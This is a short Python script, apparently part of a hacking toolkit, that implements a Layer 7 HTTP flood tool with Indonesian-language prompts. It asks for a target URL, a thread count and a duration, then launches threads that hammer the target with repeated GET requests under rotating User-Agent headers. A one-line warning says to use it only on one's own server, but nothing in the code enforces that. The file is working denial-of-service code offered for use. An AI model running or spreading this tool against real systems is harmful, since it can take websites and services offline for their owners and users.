import requests
import threading
import random
import time
from utils.color import red, green, yellow, cyan

def flood(target_url):
    try:
        headers = {
            "User-Agent": random.choice([
                "Mozilla/5.0", "curl/7.88", "python-requests/2.31", "ddos-test/1.0"
            ])
        }
        response = requests.get(target_url, headers=headers, timeout=3)
        print(green(f"🔥 Status: {response.status_code} | Target: {target_url}"))
    except requests.exceptions.RequestException as e:
        print(red(f"💥 Error: {str(e)}"))

def run():
    print(red("\n🚨 WARNING! Layer 7 HTTP Flood tool aktif"))
    print(yellow("💣 Gunakan hanya untuk testing VPS/Server lo sendiri!\n"))

    target = input(cyan("🌐 Masukkan URL target (contoh: http://localhost): "))
    threads = int(input("🔁 Jumlah thread: "))
    duration = int(input("⏱️ Durasi (detik): "))

    print(green(f"\n🚀 Menyerang {target} dengan {threads} thread selama {duration} detik...\n"))

    end_time = time.time() + duration

    def attack():
        while time.time() < end_time:
            flood(target)

    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=attack)
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join()

    print(green("\n✅ Serangan selesai. Periksa log server target untuk hasilnya. 😎"))

